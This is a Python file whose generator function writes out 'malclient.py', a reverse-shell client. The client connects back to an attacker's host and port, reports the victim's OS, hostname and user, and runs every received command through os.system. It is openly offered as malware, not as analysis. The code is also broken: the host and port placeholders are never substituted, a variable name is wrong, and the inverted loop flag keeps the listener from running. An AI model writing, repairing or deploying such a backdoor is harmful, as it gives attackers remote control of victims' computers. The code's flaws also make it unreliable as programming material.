def CreateScript(lhost,lport):
    baseScript = '''
import socket
import os
import threading
import subprocess

CONNECTIONENDED = True

def ListenToServer(server):
    global CONNECTIONENDED
    try:
        while CONNECTIONENDED == False:
            recvBuffer = server.recv(1024)
            os.system(recv.decode())
    except Exception as e:
        server.close()
        CONNECTIONENDED = False

def StartClient():
    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    global CONNECTIONENDED

    try:
        clientsocket.connect(({lhost}, {lport}))

        # Turn on listener
        serverListener = threading.Thread(target=ListenToServer, args=[clientsocket])
        serverListener.start()

        # Send system info
        sysInfo = ""
        if os.name == 'nt':
            sysInfo = f"{\"os\":\"Windows\",\"user\":\"{os.system('whoami')}\"}"
        elif os.name == 'posix':
            sysInfo = f"{\"os\":\"Unix\",\"user\":\"{subprocess.check_output(['echo \\\"$(hostname)\\$(whoami)\\\"'], text=True)}\"}"

        clientsocket.send(sysInfo.encode())
        clientsocket.recv(64)

        serverListener.join()

    except Exception as e:
        CONNECTIONENDED = False
        clientsocket.close()

def main():
    StartClient()

if __name__ == "__main__":
    main()
'''
    with open('malclient.py', 'w') as MalScript:
        MalScript.write(baseScript)
    print(f"[+] Created malclient.py")